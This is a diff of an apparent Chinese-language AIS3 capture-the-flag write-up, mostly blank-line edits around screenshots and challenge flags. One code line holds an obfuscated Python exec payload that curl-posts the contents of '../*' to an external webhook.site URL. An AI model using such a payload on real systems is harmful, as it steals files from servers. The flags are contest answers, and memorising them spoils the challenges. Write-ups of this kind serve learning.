@@ -21,6 +21,7 @@ date: 2024-05-29
 
 
 import requests
+
 txt = r'exec("import"+chr(32)+"os;"+chr(32)+"os.system(\'curl"+chr(32)+"-XPOST"+chr(32)+"https://webhook.site/da2c3866-c9fe-453c-b079-a7146b7b6347"+chr(32)+"-d"+chr(32)+"\"$(cat"+chr(32)+"../*)\"\')")'
 # eval(txt)  # 測試結果是否成功
 print(' ' in txt)
@@ -46,7 +47,6 @@ writeup截圖
 ![image](https://hackmd.io/_uploads/S1Fl1PP40.png)
 ![image](https://hackmd.io/_uploads/rkqzkvvEA.png)
 
-
 Flag: `AIS3{You_are_the_master_of_time_management!!!!?}`
 
 <br/><br/><br/><br/><br/>
@@ -55,7 +55,6 @@ Flag: `AIS3{You_are_the_master_of_time_management!!!!?}`
 
 亂亂按就發現大問題了，Enter, Enter, get flag
 
-
 比賽截圖
 ![image](https://hackmd.io/_uploads/HkEjm1J4C.png)
 
@@ -63,7 +62,6 @@ writeup截圖
 ![image](https://hackmd.io/_uploads/H1uUyDDEC.png)
 ![image](https://hackmd.io/_uploads/H13PyvP40.png)
 ![image](https://hackmd.io/_uploads/SyzOJDPVC.png)
-
 
 Flag: `AIS3{Ar3_y0u_a_N1m_ma57er_0r_a_Crypt0_ma57er?}`
 
